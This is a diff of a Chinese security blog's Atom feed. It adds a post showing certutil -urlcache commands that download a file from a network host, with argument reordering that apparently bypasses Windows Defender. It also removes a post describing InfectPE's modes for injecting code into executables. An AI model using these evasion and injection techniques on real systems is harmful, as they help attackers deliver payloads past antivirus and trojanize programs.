@@ -57,6 +57,28 @@
   </entry>
   
   <entry>
+    <title>certutil_bypassWindows Defender</title>
+    <link href="www.ggsec.cn/certutil.html"/>
+    <id>www.ggsec.cn/certutil.html</id>
+    <published>2018-10-03T01:56:03.000Z</published>
+    <updated>2018-10-03T01:59:50.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/IMG_20181003_095413.jpg" alt="enter description here"><br><a id="more"></a><br>参数拦截</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\demon&gt;certutil -urlcache -split -f http:<span class="comment">//192.168.10.125/1.txt</span></span><br><span class="line">拒绝访问。</span><br><span class="line"></span><br><span class="line">C:\Users\demon&gt;certutil  -split -urlcache -f http:<span class="comment">//192.168.10.125/1.txt</span></span><br><span class="line">****  联机  ****</span><br><span class="line">  <span class="number">0000</span>  ...</span><br><span class="line">  <span class="number">0016</span></span><br><span class="line">CertUtil: -URLCache 命令成功完成。</span><br></pre></td></tr></table></figure><p><img src="http://oc78wb8cz.bkt.clouddn.com/1538531958327.jpg" alt="enter description here"></p><p><img src="http://oc78wb8cz.bkt.clouddn.com/1538531971508.jpg" alt="enter description here"><br><a href="https://twitter.com/lampnout/status/1047122224581419009" target="_blank" rel="noopener">https://twitter.com/lampnout/status/1047122224581419009</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/IMG_20181003_095413.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
+    
+    
+      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
     <title>stager_dll</title>
     <link href="www.ggsec.cn/stager-dll.html"/>
     <id>www.ggsec.cn/stager-dll.html</id>
@@ -404,28 +426,6 @@
     <summary type="html">
     
       &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/IMG_20180529_235529.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
-    
-    
-      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>InfectPE</title>
-    <link href="www.ggsec.cn/InfectPE.html"/>
-    <id>www.ggsec.cn/InfectPE.html</id>
-    <published>2018-04-22T11:45:00.000Z</published>
-    <updated>2018-07-01T06:38:04.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/IMG_20180422_194348_01.jpg" alt="enter description here"><br><a id="more"></a></p><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/InfectPE.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><h2 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h2><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=53840" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=53840</a></p><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><p>.\InfectPE.exe .\input.exe .\out.exe code<br>X代码被注入代码段，这种方法更隐蔽，但有时代码段中没有足够的空间。</p><p>.\InfectPE.exe .\input.exe .\out.exe largest<br>X代码被注入到零个数最多的部分，使用这种方法可以注入更大的x代码。该方法修改了该部分的特征，并且更加可疑。</p><p>.\InfectPE.exe .\input.exe .\out.exe resize<br>展开代码段的大小并注入x代码。这种技术，就像“代码”一样，不太可疑，也可以注入更大的x代码。</p><p>.\InfectPE.exe .\input.exe .\out.exe new<br>创建一个新的部分并向其中注入x代码，该部分的硬编码名称是“.infect”</p><p>在补丁文件中，ASLR和NX被禁用，您可以分析VS项目的更多技术信息。</p><p>请不要使用打包或格式不正确的可执行文件。</p><p><img src="http://oc78wb8cz.bkt.clouddn.com/B6255317-B3BE-44A1-A454-00CF11F06358.png" alt="enter description here"></p><p>Github   <a href="https://github.com/secrary/InfectPE" target="_blank" rel="noopener">https://github.com/secrary/InfectPE</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/IMG_20180422_194348_01.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
     
     </summary>
     
